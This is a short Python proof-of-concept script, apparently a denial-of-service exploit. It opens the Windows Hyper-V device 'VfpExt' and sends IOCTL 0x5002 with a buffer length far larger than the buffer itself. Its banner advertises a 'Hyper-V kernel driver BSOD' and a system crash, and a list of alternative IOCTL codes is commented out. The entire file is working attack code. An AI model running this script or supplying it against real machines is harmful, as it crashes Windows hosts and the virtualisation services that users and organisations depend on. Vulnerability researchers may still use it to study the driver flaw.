import ctypes, sys
from ctypes import *
import io
from itertools import product
from sys import argv
import time

devicename = "VfpExt"

#ioctl = 0x490007
#ioctl = 0x222F3B
#ioctl = 0x222F0B
#ioctl = 0x43073
#ioctl = 0x00070403
#ioctl = 0x00070407
#ioctl = 0x000b0003
#ioctl = 0xc0010004
#ioctl = 0x3203
#ioctl = 0x87
#ioctl = 0x500f

ioctl = 0x5002

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\VfpExt", 0xC0000000, 0, None, 0x3, 0, None) 

if not hevDevice or hevDevice == -1:
    print ("Not Win! Sorry!")

else:
    print ("            Hyper-V kernel driver BSOD 2021")
    print ("                    CVE-????-?????")
    print ("[x] System crash....")


    buf = 'A' * 10
    bufLength = 20000
    
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)
